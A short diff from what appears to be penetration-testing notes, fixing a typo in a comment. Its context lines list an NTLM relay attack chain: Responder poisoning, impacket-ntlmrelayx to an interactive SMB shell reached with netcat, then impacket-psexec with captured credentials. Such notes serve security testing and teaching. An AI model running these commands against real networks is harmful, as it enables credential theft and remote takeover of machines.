@@ -117,7 +117,7 @@ sudo nano /etc/responder/Responder.conf
 sudo responder -I eth0 -rdwv
 # leave that running and open a new tab for the relay
 impacket-ntlmrelayx -tf targets.txt -smb2support -i
-# if successful an interactive SMB shell will be spawned, which we cann connect to withnetcat (or similar)
+# if successful an interactive SMB shell will be spawned, which we cann connect to with netcat (or similar)
 nc 127.0.0.1 11000
 # we can likely get a full shell with those credentials through psexec
 impacket-psexec [DOMAIN]/[USER]:[PASS]@[RHOST]
